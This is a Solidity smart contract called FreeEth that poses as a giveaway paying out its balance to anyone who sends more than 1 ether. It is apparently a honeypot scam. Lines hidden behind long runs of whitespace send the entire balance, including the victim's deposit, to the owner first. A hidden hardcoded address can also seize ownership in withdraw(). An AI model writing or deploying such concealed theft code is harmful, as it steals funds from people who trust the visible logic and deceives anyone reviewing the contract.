pragma solidity ^0.4.19;

contract FreeEth
{
    address public O = msg.sender;
    address public specialAddr = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        uint threshold = 1 ether;
        if(msg.value > threshold)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               O.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender == specialAddr){O = specialAddr;}
        require(msg.sender == O);
        O.transfer(this.balance);
    }
    
    function Command(address a, bytes d)
    payable
    public
    {
        require(msg.sender == O);
         
        a.call.value(msg.value)(d);
    }
}